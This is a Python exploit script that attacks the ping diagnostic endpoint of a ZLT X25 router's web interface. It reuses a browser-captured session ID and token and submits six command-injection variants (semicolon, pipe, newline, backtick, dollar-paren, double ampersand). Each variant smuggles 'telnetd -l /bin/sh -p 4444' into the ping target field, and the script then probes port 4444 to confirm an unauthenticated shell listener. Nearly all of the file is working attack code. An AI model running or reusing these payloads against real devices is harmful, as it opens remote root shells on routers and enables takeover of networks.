#!/usr/bin/env python3
"""
ZLT X25 Injection Diagnostic — Phase 2
Uses the REAL sessionId and token captured from your browser.
No login needed — just tests injection payload formats directly.

Usage:
    python3 diag.py
"""

import json
import re
import sys
import urllib.error
import urllib.request

ROUTER_IP = "192.168.1.1"
PROTO     = "http"

# ── These come from YOUR browser Dev Tools capture ────────────────────────────
# sessionId: from any http.cgi request → Payload tab → sessionId field
# token:     from the cmd:168 START request → Payload tab → token field
REAL_SID   = "437435bcafc9ed3f6c6a7b33d92491dec9ccc9a81ebeae6c2fd561a3269d54a2"
REAL_TOKEN = "8ee7e67a7e93951aae181da52f12d189"
# ─────────────────────────────────────────────────────────────────────────────

url = f"{PROTO}://{ROUTER_IP}/cgi-bin/http.cgi"


def post_json(payload, session_id=""):
    headers = {
        "Content-Type":     "application/json",
        "X-Requested-With": "XMLHttpRequest",
        "Origin":           f"{PROTO}://{ROUTER_IP}",
        "Referer":          f"{PROTO}://{ROUTER_IP}/index.html",
        "User-Agent":       "Mozilla/5.0",
    }
    if session_id:
        headers["Cookie"] = f"sessionId={session_id}"
    data = json.dumps(payload).encode()
    print(f"\n>>> POST {url}")
    print(f"    payload : {json.dumps(payload)}")
    try:
        req = urllib.request.Request(url, data=data, headers=headers, method="POST")
        with urllib.request.urlopen(req, timeout=8) as resp:
            body = resp.read().decode("utf-8", errors="ignore")
            print(f"    status  : HTTP {resp.status}")
            print(f"    body    : {body[:400]}")
            return resp.status, body
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="ignore")
        # Strip HTML for cleaner output
        body_clean = re.sub(r"<[^>]+>", "", body).strip()
        print(f"    status  : HTTP {e.code} ERROR")
        print(f"    body    : {body_clean[:200]}")
        return e.code, body
    except Exception as exc:
        print(f"    EXCEPTION: {exc}")
        return 0, str(exc)


# ── STEP 1: Verify session is still alive ─────────────────────────────────────
print("=" * 60)
print("STEP 1 — VERIFY SESSION IS ALIVE (cmd:113)")
print("=" * 60)
print(f"Using sessionId: {REAL_SID[:20]}…")
print(f"Using token:     {REAL_TOKEN}")

s, b = post_json({
    "cmd": 113, "method": "GET",
    "language": "en", "sessionId": REAL_SID,
}, session_id=REAL_SID)

if s == 200 and '"success":true' in b:
    print("\n✔ Session is ALIVE — proceeding to injection tests")
else:
    print("\n✘ Session is DEAD or rejected.")
    print("  You need a fresh sessionId. Do this:")
    print("  1. Open http://192.168.1.1 in Chrome and log in")
    print("  2. Open Dev Tools → Network tab")
    print("  3. Click any http.cgi request → Payload tab")
    print("  4. Copy the sessionId value")
    print("  5. Update REAL_SID at the top of this file")
    print("  6. Run diag.py again")
    sys.exit(1)

# ── STEP 2: Test clean ping first (no injection) ──────────────────────────────
print("\n" + "=" * 60)
print("STEP 2 — CLEAN PING (exact browser format, no injection)")
print("=" * 60)

s, b = post_json({
    "cmd": 168, "method": "POST", "subcmd": 0,
    "pingTimes": 1,
    "url": "127.0.0.1",
    "token": REAL_TOKEN,
    "language": "en",
    "sessionId": REAL_SID,
}, session_id=REAL_SID)

if s == 200:
    print("\n✔ Clean ping ACCEPTED — format is correct")
    CLEAN_WORKS = True
else:
    print("\n✘ Even a clean ping is rejected — token is stale or format wrong")
    print("  Get a fresh token:")
    print("  1. On the Diagnosis page, open Dev Tools → Network")
    print("  2. Click Start (with 127.0.0.1)")
    print("  3. Click the FIRST http.cgi request at the top of the list")
    print("  4. Payload tab → copy the 'token' value")
    print("  5. Update REAL_TOKEN at the top of this file and rerun")
    CLEAN_WORKS = False

# ── STEP 3: Test injection payloads ──────────────────────────────────────────
print("\n" + "=" * 60)
print("STEP 3 — INJECTION PAYLOADS")
print("=" * 60)

if not CLEAN_WORKS:
    print("Skipping — fix the token first (see above)")
    sys.exit(1)

candidates = [
    # A: semicolon injection (classic)
    "127.0.0.1 ; telnetd -l /bin/sh -p 4444",
    # B: pipe injection
    "127.0.0.1 | telnetd -l /bin/sh -p 4444",
    # C: newline injection
    "127.0.0.1\ntelnetd -l /bin/sh -p 4444",
    # D: backtick injection
    "127.0.0.1 `telnetd -l /bin/sh -p 4444`",
    # E: dollar-paren injection
    "127.0.0.1 $(telnetd -l /bin/sh -p 4444)",
    # F: double ampersand
    "127.0.0.1 && telnetd -l /bin/sh -p 4444",
]

for i, cmd_str in enumerate(candidates, 1):
    print(f"\n--- Injection variant {i}: {cmd_str!r} ---")
    s, b = post_json({
        "cmd": 168, "method": "POST", "subcmd": 0,
        "pingTimes": 1,
        "url": cmd_str,
        "token": REAL_TOKEN,
        "language": "en",
        "sessionId": REAL_SID,
    }, session_id=REAL_SID)

    if s == 200:
        print(f"    ✔ ACCEPTED (HTTP 200)")
        print(f"    body: {b[:300]}")
        print(f"\n>>> NOW CHECK: does port 4444 respond?")
        import socket
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((ROUTER_IP, 4444))
            sock.close()
            if result == 0:
                print(f"    ✔✔ PORT 4444 IS OPEN — INJECTION WORKED!")
            else:
                print(f"    Port 4444 closed — injection accepted but telnetd may not have started")
        except Exception as e:
            print(f"    Port check error: {e}")
    elif s == 400:
        b_clean = re.sub(r"<[^>]+>", "", b).strip()
        print(f"    ✘ HTTP 400 — {b_clean[:100]}")
    else:
        print(f"    ? HTTP {s}")

print("\n" + "=" * 60)
print("DONE")
print("=" * 60)
